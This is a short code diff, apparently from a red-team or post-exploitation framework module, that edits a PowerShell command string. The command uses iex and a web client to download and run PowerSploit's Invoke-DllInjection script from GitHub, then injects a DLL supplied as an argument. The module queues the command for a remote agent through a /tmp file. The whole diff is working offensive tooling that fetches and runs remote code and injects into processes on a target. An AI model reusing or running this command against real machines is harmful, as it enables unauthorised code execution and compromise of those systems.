@@ -32,7 +32,7 @@ class CustomModule(Module):
                 break
 
         if warrior_exist:
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1')"
+            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1');"
             function += 'Invoke-DllInjection -dll "{}"'.format(self.args["dll"])
 
             with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
